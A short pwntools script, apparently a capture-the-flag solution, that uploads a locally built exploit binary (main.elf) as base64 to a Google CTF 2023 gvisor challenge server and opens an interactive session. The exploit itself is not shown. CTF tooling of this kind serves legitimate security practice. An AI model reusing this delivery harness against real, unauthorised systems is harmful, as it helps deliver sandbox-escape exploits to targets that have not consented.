from pwn import *
from pathlib import Path
import base64

p = remote('gvisor.2023.ctfcompetition.com', 1337)

payload = Path("main.elf").read_bytes()
payload_b64 = base64.b64encode(payload)

print(p.recvuntil("How many bytes is your base64-encoded exploit? ").decode())
p.sendline(f"{len(payload_b64)}")
p.sendline(payload_b64)

p.interactive()
